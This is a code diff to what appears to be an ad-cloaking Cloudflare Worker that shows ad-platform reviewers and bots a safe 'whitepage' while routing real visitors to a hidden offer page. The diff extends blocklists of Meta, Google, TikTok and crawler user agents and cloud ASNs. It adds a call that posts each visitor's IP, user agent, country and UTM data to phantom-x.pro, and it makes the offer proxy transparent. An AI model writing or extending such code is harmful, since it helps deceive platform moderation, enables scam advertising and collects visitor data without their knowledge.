@@ -42,9 +42,11 @@ export interface CloakerAssessment {
 export const BLOCKED_ASNS_MAP: Record<number, string> = {
   32934: "Meta Platforms / Facebook Bot Network",
   63293: "Meta Platforms Infrastructure",
+  398324: "Meta External Crawler Subnet",
   16509: "Amazon AWS Datacenter",
   14618: "Amazon AWS EC2",
   15169: "Google Cloud Infrastructure",
+  396982: "Google Cloud Virtual Machines",
   8075: "Microsoft Azure Hosting",
   14061: "DigitalOcean Datacenter",
   16276: "OVH Hosting SAS",
@@ -54,6 +56,12 @@ export const BLOCKED_ASNS_MAP: Record<number, string> = {
   20473: "Vultr / Choopa Datacenter",
   60068: "CDN77 / Spy Services",
   46652: "AdPlexity / Spy Scrapers",
+  31898: "Oracle Cloud Infrastructure",
+  9009: "M247 Ltd / Commercial VPNs",
+  45102: "Alibaba Cloud Datacenter",
+  135377: "ByteDance / TikTok Scraper Network",
+  62240: "Clouvider Hosting",
+  49505: "Selectel Datacenter",
 };
 
 export const BLOCKED_ASNS_SET = new Set<number>(
@@ -68,16 +76,21 @@ export const BOT_PATTERNS: string[] = [
   "fbadsbot",
   "meta-externalagent",
   "meta-externalfetcher",
+  "facebookcatalog",
   "googlebot",
   "adsbot-google",
   "google-adsbot",
+  "google-inspectiontool",
+  "storebot-google",
   "mediapartners-google",
   "tiktokbot",
   "tiktokspider",
+  "bytespider",
   "bytedance",
   "bingbot",
   "adidxbot",
   "headlesschrome",
+  "chrome-lighthouse",
   "phantomjs",
   "selenium",
   "puppeteer",
@@ -89,6 +102,17 @@ export const BOT_PATTERNS: string[] = [
   "ahrefs",
   "adplexity",
   "spyfu",
+  "petalbot",
+  "yandexbot",
+  "duckduckbot",
+  "ia_archiver",
+  "httpclient",
+  "axios",
+  "postmanruntime",
+  "go-http-client",
+  "scrapy",
+  "urllib",
+  "node-fetch",
 ];
 
 export const RESIDENTIAL_ISPS: Record<string, { asn: number; org: string }[]> = {
@@ -625,6 +649,30 @@ export default {
     }
 
     const targetUrl = isModerator ? CONFIG.WHITEPAGE_URL : CONFIG.OFERTA_URL;
+
+    // Telemetria assíncrona para o console Phantom-X (sem adicionar latência)
+    if (ctx && typeof ctx.waitUntil === "function") {
+      ctx.waitUntil(
+        fetch("https://phantom-x.pro/api/v1/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            domain: url.hostname,
+            targetUrl: targetUrl,
+            referrer: request.headers.get("referer") || "Direto",
+            userAgent: userAgent,
+            ip: clientIp,
+            isThreat: isModerator,
+            decision: isModerator ? "mitigated_safe" : "routed_offer",
+            riskScore: isModerator ? 98 : 4,
+            countryCode: country,
+            asn: asn,
+            utmParams: Object.fromEntries(url.searchParams.entries()),
+          }),
+        }).catch(() => {})
+      );
+    }
+
     return serveTarget(request, targetUrl, isModerator);
   },
 };
@@ -639,10 +687,25 @@ async function serveTarget(request, destination, isModerator) {
     finalTarget = new URL(destination, request.url);
   }
 
-  finalTarget.search = currentUrl.search;
+  // Preserva parâmetros e UTMs da requisição original
+  currentUrl.searchParams.forEach((val, key) => {
+    finalTarget.searchParams.set(key, val);
+  });
+
+  // Headers transparentes de Proxy Reverso (Host reescrito para o destino final)
+  const upstreamHeaders = new Headers(request.headers);
+  upstreamHeaders.set("Host", finalTarget.host);
+  upstreamHeaders.set("X-Forwarded-Host", currentUrl.host);
+  upstreamHeaders.set("X-Forwarded-Proto", currentUrl.protocol.replace(":", ""));
+  upstreamHeaders.set("X-Real-IP", request.headers.get("cf-connecting-ip") || "");
+  upstreamHeaders.delete("cf-ray");
+  upstreamHeaders.delete("cf-connecting-ip");
 
   const upstreamResponse = await fetch(finalTarget.toString(), {
-    headers: request.headers,
+    method: request.method,
+    headers: upstreamHeaders,
+    body: request.method !== "GET" && request.method !== "HEAD" ? request.body : undefined,
+    redirect: "follow",
   });
 
   const responseHeaders = new Headers(upstreamResponse.headers);
@@ -653,7 +716,7 @@ async function serveTarget(request, destination, isModerator) {
   }
 
   return new Response(upstreamResponse.body, {
-    status: 200,
+    status: upstreamResponse.status || 200,
     headers: responseHeaders,
   });
 }
